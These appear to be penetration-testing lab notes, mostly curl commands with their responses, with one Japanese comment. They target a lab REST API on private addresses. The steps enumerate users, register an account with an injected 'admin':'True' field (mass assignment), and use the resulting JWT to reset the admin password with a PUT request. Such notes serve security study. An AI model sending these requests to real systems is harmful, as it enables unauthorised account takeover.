```sh
curl -i http://192.168.1.1/users/v1
# HTTP/1.0 200 OK
# Content-Type: application/json
# Content-Length: 241
# Server: Werkzeug/1.0.1 Python/3.7.13
# Date: Wed, 06 Apr 2022 09:27:50 GMT
# 
# {
#   "users": [
#     {
#       "email": "mail1@mail.com",
#       "username": "name1"
#     }, ......


curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.1.1/users/v1/login
# { "status": "fail", "message": "Password is not correct for the given username."}

# 必要な項目の他、adminやrootといった管理者っぽい項目も試すとうまくいくことがある
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.1.1/users/v1/register
# {"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

# {
#   "detail": "The method is not allowed for the requested URL.",
#   "status": 405,
#   "title": "Method Not Allowed",
#   "type": "about:blank"
# }


curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```